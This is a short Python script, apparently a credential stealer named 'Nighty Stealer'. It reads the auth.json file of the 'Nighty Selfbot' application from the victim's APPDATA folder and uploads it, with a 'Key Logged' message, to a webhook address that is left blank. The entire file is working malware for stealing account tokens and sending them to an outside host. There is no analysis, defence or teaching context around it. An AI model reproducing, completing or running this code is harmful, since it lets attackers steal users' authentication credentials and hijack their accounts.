import os
import json
import requests

Sendy = ''

Pathy = os.path.join(os.environ['APPDATA'], 'Nighty Selfbot', 'auth.json')
with open(Pathy, 'r') as file:

    nighty = json.load(file)
    
Payload = {
    "content": "Nighty Key Logged!",
    "username": "Nighty Stealer",
    "avatar": "https://i.pinimg.com/564x/ef/db/32/efdb32e6c63c15ab42ca6d37200d391f.jpg"
}
Files = {
    'file': open(Pathy, 'rb')
}

response = requests.post(Sendy, data=Payload, files=Files)
